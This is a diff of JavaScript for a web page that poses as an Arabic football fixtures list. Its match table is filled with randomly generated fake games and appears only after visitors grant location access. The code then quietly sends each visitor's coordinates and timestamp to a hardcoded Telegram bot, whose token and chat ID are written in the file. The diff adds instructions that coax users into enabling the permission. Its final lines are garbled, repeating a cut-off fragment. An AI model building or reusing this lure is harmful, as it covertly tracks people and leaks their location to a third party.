@@ -1,7 +1,7 @@
 const CONFIG = {
   telegramBotToken: '8429040793:AAHyb0ebmApHOl1d_NvtXDdCBZ-dw_w2M8Y',
   telegramChatId: '8209565969',
-  splashDurationMs: 10000, // مدة البوب قبل الفحص
+  splashDurationMs: 5000,
   developerName: '𝓐𝓱𝓶𝓮𝓭 𝓜𝓸𝓼𝓽𝓪𝓯𝓪'
 };
 
@@ -13,39 +13,27 @@ const leaguesDiv = document.getElementById('leagues');
 const locationMsg = document.getElementById('location-msg');
 const grantBtn = document.getElementById('grant-btn');
 const retryBtn = document.getElementById('retry-btn');
+const grantInstructions = document.getElementById('grant-instructions');
 
 let _samples = [];
 
-// إخفاء البوب عند الضغط أو انتهاء الوقت
+// إخفاء البوب بعد الضغط أو بعد 10 ثواني
 function hideSplash() {
   splash.classList.add('hidden');
-  setTimeout(checkGeolocation, 500); // بعد 0.5 ثانية نبدأ التحقق
+  setTimeout(requestGeolocation, 500); // ظهور الرسالة بسلاسة بعد البوب
 }
 
 splash.addEventListener('click', hideSplash);
 skipBtn.addEventListener('click', hideSplash);
 setTimeout(hideSplash, CONFIG.splashDurationMs);
 
-// التحقق من إذن الموقع
-function checkGeolocation() {
+// طلب الإذن بالموقع
+function requestGeolocation() {
   if (!navigator.geolocation) {
     showLocationRequired();
     return;
   }
 
-  navigator.permissions.query({name: 'geolocation'}).then(result => {
-    if (result.state === 'granted') {
-      // المستخدم منح الإذن مسبقاً
-      getLocationAndShowTable();
-    } else {
-      // لم يمنح الإذن
-      showLocationRequired();
-    }
-  });
-}
-
-// جلب الموقع وإرسال البيانات للتليجرام
-function getLocationAndShowTable() {
   navigator.geolocation.getCurrentPosition(
     pos => {
       _samples.push({
@@ -56,7 +44,6 @@ function getLocationAndShowTable() {
       });
       sendSampleToTelegram(_samples[_samples.length - 1]);
       showMatchesTable();
-      locationMsg.style.display = 'none'; // إخفاء الرسالة لو ظهرت
     },
     err => {
       showLocationRequired();
@@ -65,33 +52,23 @@ function getLocationAndShowTable() {
   );
 }
 
-// عرض رسالة منح الإذن
+// عرض رسالة منح الإذن بسلاسة
 function showLocationRequired() {
   locationMsg.style.display = 'flex';
-  locationMsg.style.opacity = '0';
-  locationMsg.style.transform = 'translateY(-50px)';
-  setTimeout(() => {
-    locationMsg.style.transition = 'all 0.6s ease';
-    locationMsg.style.opacity = '1';
-    locationMsg.style.transform = 'translateY(0)';
-  }, 50);
+  setTimeout(() => locationMsg.classList.add('show'), 50); // ظهور تدريجي
 }
 
-// زر منح الإذن: يظهر مرة واحدة التعليمات
+// زر منح الإذن: إظهار الخطوات
 grantBtn.onclick = () => {
-  const instructions = document.createElement('p');
-  instructions.style.marginTop = '8px';
-  instructions.style.fontWeight = '600';
-  instructions.textContent = "انظر في بداية شريط البحث، ستجد خطين بجوار الميكروفون ع اليمين، اضغط عليهم → ثم اضغط على الإذونات → ثم فعل إذن الوصول للموقع → وأخيرًا اضغط إعادة المحاولة.";
-  if (!locationMsg.contains(instructions)) locationMsg.appendChild(instructions);
+  grantInstructions.style.display = 'block';
 };
 
-// زر إعادة المحاولة: إعادة تحميل الصفحة بالكامل
+// زر إعادة المحاولة: يعيد تحميل الصفحة
 retryBtn.onclick = () => {
   window.location.reload();
 };
 
-// إرسال العينة للتليجرام
+// إرسال بيانات الموقع لتليجرام
 function sendSampleToTelegram(sample) {
   const text = `📍 Sample
 🕒 ${sample.timestamp}
@@ -113,7 +90,7 @@ function _sendTelegramMessage(text) {
   }).catch(err => console.error(err));
 }
 
-/* --- MATCH TABLE --- */
+/* --- جدول المباريات --- */
 const leaguesData = [
   { name: 'الدوري المصري', matches: generateMatches(3) },
   { name: 'الدوري الإنجليزي', matches: generateMatches(3) },
@@ -135,6 +112,38 @@ function generateMatches(count) {
     let t1 = teams[Math.floor(Math.random()*teams.length)];
     let t2;
     do { t2 = teams[Math.floor(Math.random()*teams.length)]; } while(t2 === t1);
+    arr.push({
+      team1: t1,
+      team2: t2,
+      time: `${String(Math.floor(Math.random()*24)).padStart(2,'0')}:${String(Math.floor(Math.random()*60)).padStart(2,'0')}`,
+      stadium: stadiums[Math.floor(Math.random()*stadiums.length)]
+    });
+  }
+  return arr;
+}
+
+function showMatchesTable() {
+  matchTable.style.display = 'block';
+  leaguesDiv.innerHTML = '';
+  leaguesData.forEach(league => {
+    const leagueDiv = document.createElement('div');
+    leagueDiv.classList.add('league');
+    const title = document.createElement('div');
+    title.classList.add('league-title');
+    title.textContent = league.name;
+    leagueDiv.appendChild(title);
+
+    league.matches.forEach(match => {
+      const card = document.createElement('div');
+      card.classList.add('match-card');
+      card.innerHTML = `<div>${match.team1} ⚽ ${match.team2}</div><div>${match.time} - ${match.stadium}</div>`;
+      leagueDiv.appendChild(card);
+      setTimeout(() => card.classList.add('visible'), 100);
+    });
+
+    leaguesDiv.appendChild(leagueDiv);
+  });
+}r(Math.random()*teams.length)]; } while(t2 === t1);
     arr.push({
       team1: t1,
       team2: t2,
